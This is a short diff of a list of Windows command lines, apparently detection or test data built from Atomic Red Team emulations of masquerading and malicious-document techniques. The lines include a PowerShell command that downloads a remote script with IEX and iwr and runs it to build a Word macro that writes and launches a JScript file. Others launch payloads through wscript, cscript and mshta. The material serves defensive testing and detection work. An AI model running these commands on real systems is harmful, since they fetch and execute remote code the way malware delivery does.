@@ -1,9 +1,6 @@
+"C:\WINDOWS\System32\WScript.exe" "C:\Users\thaim\AppData\Local\Temp\AtomicTest.vbs"
 "C:\WINDOWS\System32\WScript.exe" "C:\Users\thaim\AppData\Local\Temp\T1036.007_masquerading.png.vbs"
 "C:\WINDOWS\System32\WScript.exe" "C:\Users\thaim\AppData\Local\Temp\T1036.007_masquerading.xls.vbs"
 "C:\WINDOWS\System32\WScript.exe" "C:\Users\thaim\AppData\Local\Temp\T1036.007_masquerading.xlsx.vbs"
-"C:\WINDOWS\System32\WScript.exe" "C:\Users\thaim\AppData\Local\Temp\AtomicTest.vbs"
-"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"" -UseBasicParsing) $macrocode = \""   Open `\""C:\Users\Public\art.jse`\"" For Output As #1`n   Write #1, `\""WScript.Quit`\""`n   Close #1`n   a = Shell(`\""cmd.exe /c wscript.exe //E:jscript C:\Users\Public\art.jse`\"", vbNormalFocus)`n\"" Invoke-MalDoc -macroCode $macrocode -officeProduct \""Word\""}
-cscript  //E:Jscript C:\Users\thaim\AppData\Local\Temp\OSTapGet.js
-cmd.exe /c "cd C:\Users\Public && wscript.exe payload.vbs"
-cscript.exe payload.js
-mshta.exe C:/Users/Public/payload.hta
+"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr \""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"" -UseBasicParsing) $macrocode = \"" Open `\""C:\Users\Public\art.jse`\"" For Output As #1`n Write #1, `\""WScript.Quit`\""`n Close #1`n a = Shell(`\""cmd.exe /c wscript.exe //E:jscript C:\Users\Public\art.jse`\"", vbNormalFocus)`n\"" Invoke-MalDoc -macroCode $macrocode -officeProduct \""Word\""}
+cscript //E:Jscript C:\Users\thaim\AppData\Local\Temp\OSTapGet.js
